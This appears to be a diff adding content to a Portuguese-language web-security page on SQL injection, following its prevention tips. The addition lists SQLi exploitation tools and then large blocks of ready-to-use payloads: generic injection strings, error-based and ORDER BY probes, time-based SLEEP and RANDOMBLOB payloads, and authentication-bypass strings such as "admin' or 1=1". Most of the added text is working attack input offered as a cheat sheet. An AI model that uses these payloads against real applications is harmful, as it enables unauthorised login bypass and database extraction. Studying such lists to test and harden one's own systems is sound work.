@@ -69,3 +69,210 @@ Aqui estão algumas práticas recomendadas para prevenir ataques de SQL Injectio
      Atualizações e patches: Mantenha seus sistemas atualizados com as últimas correções de segurança.
   </li>
 </ul>
+
+## Ferramentas para Detecção de Vulnerabilidades de SQL Injection:
+
+* [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatização de Injeção de SQL e Ferramenta de Extração de Dados de Bancos de Dados
+
+* [BBQSQL](https://github.com/Neohapsis/bbqsql) – Uma Ferramenta para Exploração de Injeção de SQL Baseada em Cegueira
+
+* [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automação de Ataques a Bancos de Dados NoSQL
+
+* [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – Scanner de Vulnerabilidades de SQL
+
+* [DSSS](https://github.com/stamparm/DSSS) – Scanner para Identificação de Vulnerabilidades de Injeção de SQL
+
+* [explo](https://github.com/dtag-dev-sec/explo) – Formato de Teste de Vulnerabilidade para Web Legível por Humanos e Máquinas
+
+* [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Exploração de Injeção de SQL Baseada em Cegueira via Bitshifting
+
+* [Leviathan](https://github.com/leviathan-framework/leviathan) - Conjunto de Ferramentas para Auditoria em Massa Abrangente
+
+* [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploração de Injeção de SQL Baseada em Tempo, Focada em Cabeçalhos HTTP (MySQL/MariaDB)
+
+## Cargas genéricas para injeção de SQL:
+
+```
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+
+Comentarios:
+
+#
+/*
+-- -
+;%00
+`
+```
+
+## Cargas genéricas baseadas em erros:
+
+```
+ OR 1=1
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR x=x-- 
+ OR x=y-- 
+
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 31337
+
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+```
+
+## Cargas genéricas baseadas em tempo para injeção de SQ:
+
+```
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+```
+
+# Cargas para bypass de autenticação em injeção de SQL
+
+```
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+admin' or 1=1
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+```
